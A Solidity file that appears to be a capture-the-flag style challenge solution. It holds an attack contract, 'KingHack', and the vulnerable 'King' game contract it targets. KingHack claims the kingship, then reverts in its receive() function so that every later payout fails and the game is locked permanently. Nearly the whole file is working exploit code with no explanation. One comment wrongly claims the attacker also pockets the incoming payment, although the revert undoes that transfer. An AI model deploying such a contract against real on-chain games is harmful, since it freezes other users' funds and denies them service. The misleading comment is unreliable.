// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract KingHack {

    address payable owner;
    King kingContract;
    
    constructor(address payable _kingContract) public {
        owner = msg.sender;
        kingContract = King(_kingContract);
    }
    
    function becomeKing() public payable returns (bool) {
        uint currentPrize = getPrize();
        
        require(msg.value >= currentPrize, "Need to send more to get that kingship");
        
        // Leverage King's fallback function
        bytes memory payload = abi.encodeWithSignature("undefinedFuntion()");
        (bool success,) = address(kingContract).call{value: msg.value}(payload);
        
        require(success);
    }
    
    function getPrize() internal view returns (uint) {
        return kingContract.prize();
    }
    
    // Once we become king, the next caller will end up at this function call when King executes king.transfer(msg.value)
    // This will effectively lock King forever and as an added bonus, we tranfer msg.value to the hacker
    receive() external payable {
        owner.transfer(msg.value);
        
        revert("Sorry, your game is broken");
    }
}

contract King {

    address payable king;
    uint public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
    }

    fallback() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}